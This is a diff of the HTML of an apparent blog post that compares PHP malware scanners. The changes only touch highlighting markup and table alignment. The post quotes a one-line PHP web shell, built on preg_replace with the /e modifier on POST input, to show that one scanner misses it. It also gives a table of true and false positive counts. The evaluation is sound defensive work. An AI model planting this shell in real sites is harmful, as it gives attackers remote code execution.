@@ -206,7 +206,7 @@ python clamav_to_yara.py -f main.ndb -o main.yara
 <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;agent&#39;</span> <span style="color:#f92672">in</span> l<span style="color:#f92672">.</span>lower() <span style="color:#f92672">and</span> <span style="color:#e6db74">&#39;google&#39;</span> <span style="color:#f92672">in</span> l<span style="color:#f92672">.</span>lower():
     score<span style="color:#f92672">.</span>append((<span style="color:#e6db74">&#39;UA_GOOGLE&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>))
 </code></pre></div><p>And even though they have added few signature directly in the code (hurrr), there are really few of them and the tool is often missing easy to detect samples. The following basic shell added to a legitimate php file would go undetected for instance:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span> <span style="color:#f92672">@</span><span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#39;/(.*)/e&#39;</span>, <span style="color:#f92672">@</span>$_POST[<span style="color:#e6db74">&#39;abcdef&#39;</span>], <span style="color:#e6db74">&#39;&#39;</span>);
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#f92672">@</span><span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#39;/(.*)/e&#39;</span>, <span style="color:#f92672">@</span>$_POST[<span style="color:#e6db74">&#39;abcdef&#39;</span>], <span style="color:#e6db74">&#39;&#39;</span>);
 </code></pre></div><p>Here is an example of result by this tool (you should add a &ndash;minscore option, 10 seems to be a good value):</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
         <span style="color:#f92672">&#34;score&#34;</span>: <span style="color:#ae81ff">15</span>,
@@ -242,30 +242,30 @@ python clamav_to_yara.py -f main.ndb -o main.yara
 <thead>
 <tr>
 <th>Tool</th>
-<th align="center">True Positive</th>
-<th align="right">False Positive</th>
+<th style="text-align:center">True Positive</th>
+<th style="text-align:right">False Positive</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td>Linux Malware Detect</td>
-<td align="center">4 / 39</td>
-<td align="right">0</td>
+<td style="text-align:center">4 / 39</td>
+<td style="text-align:right">0</td>
 </tr>
 <tr>
 <td>ClamAV (default)</td>
-<td align="center">4 / 39</td>
-<td align="right">0</td>
+<td style="text-align:center">4 / 39</td>
+<td style="text-align:right">0</td>
 </tr>
 <tr>
 <td>php-malware-finder</td>
-<td align="center">28 / 39</td>
-<td align="right">126</td>
+<td style="text-align:center">28 / 39</td>
+<td style="text-align:right">126</td>
 </tr>
 <tr>
 <td>php-malware-scanner (minscore 10)</td>
-<td align="center">10 / 39</td>
-<td align="right">0</td>
+<td style="text-align:center">10 / 39</td>
+<td style="text-align:right">0</td>
 </tr>
 </tbody>
 </table>
